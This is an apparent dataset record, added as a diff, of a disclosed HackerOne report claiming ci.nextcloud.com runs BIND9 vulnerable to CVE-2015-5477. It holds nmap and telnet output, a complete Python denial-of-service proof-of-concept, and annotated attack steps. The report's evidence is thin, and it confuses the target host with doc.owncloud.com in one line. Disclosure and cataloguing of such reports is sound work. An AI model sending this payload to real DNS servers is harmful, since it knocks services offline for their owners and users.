@@ -1,0 +1,38 @@
+{
+  "reported_to": "Nextcloud",
+  "reported_by": "m4nx ",
+  "title": "ci.nextcloud.com: CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)",
+  "content": "\nHello Team NextCloud,\nIn reference report #217381\nI've reported the DDOS attack via DNS Port at OwnCloud..\nAnd it was successfully patched.\nBut now same issue I got at\nCode 16 Bytes\n1ci.nextcloud.com\nProof Of Concept:\nHere it is the nmap result of ci.nextcloud.com\nNMap Scan Results:\nCode 335 Bytes\n1Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-08 04:12 PKT\n2Nmap scan report for ci.nextcloud.com (\u2588\u2588\u2588\u2588\u2588)\n3Host is up (0.077s latency).\n4rDNS record for \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5Not shown: 96 filtered ports\n6PORT    STATE SERVICE    VERSION\n722/tcp  open  tcpwrapped\n853/tcp  open  tcpwrapped\n980/tcp  open  tcpwrapped\n10443/tcp open  tcpwrapped\nNow here it is the telnet result:\nCode 120 Bytes\n1\u2500\u2500\u257c $telnet\n2telnet> open\n3(to) ci.nextcloud.com 53\n4Trying \u2588\u2588\u2588...\n5Connected to ci.nextcloud.com.\n6Escape character is '^]'.\nSo this can leads to a serious DDOS attack at doc.owncloud.com using the exploit..\nExploit Link:\nCode 34 Bytes\n1https://github.com/elceef/tkeypoc/\nVulnerability Reference CVE Details:\nCode 60 Bytes\n1https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5477\nExploit PoC:\nExploit Title: PoC for BIND9 TKEY DoS\nExploit Author: elceef\nSoftware Link: https://github.com/elceef/tkeypoc/\nVersion: ISC BIND 9\nTested on: multiple\nCVE : CVE-2015-5477\nCode 544 Bytes\n1!/usr/bin/env python\n2\n3import socket\n4import sys\n5\n6print('CVE-2015-5477 BIND9 TKEY PoC')\n7\n8if len(sys.argv) < 2:\n9print('Usage: ' + sys.argv[0] + ' [target]')\n10sys.exit(1)\n11\n12print('Sending packet to ' + sys.argv[1] + ' ...')\n13\n14payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))\n15\n16sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n17sock.sendto(payload, (sys.argv[1], 53))\n18\n19print('Done.')\nThanks :)\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Uncontrolled Resource Consumption"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1496958660,
+  "report_url": "https://hackerone.com/reports/237860",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Run an Nmap scan on ci.nextcloud.com to identify open ports, particularly port 53 (DNS)."
+    ],
+    [
+      2,
+      "Use the provided Python script (tkeypoc) to send a crafted TKEY query to the target DNS server (ci.nextcloud.com:53)."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a known Denial of Service (DoS) issue in BIND9 (CVE-2015-5477) where a specially crafted TKEY query can cause the DNS server to crash. The report indicates that ci.nextcloud.com is running a vulnerable version of BIND9 with port 53 exposed, making it susceptible to this exploit.",
+  "reason": "The attack involves a single, well-documented exploit (CVE-2015-5477) with a publicly available PoC script. The steps are straightforward: identify the open DNS port and send the malicious payload. No complex interactions or novel logic is required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": "217381"
+}
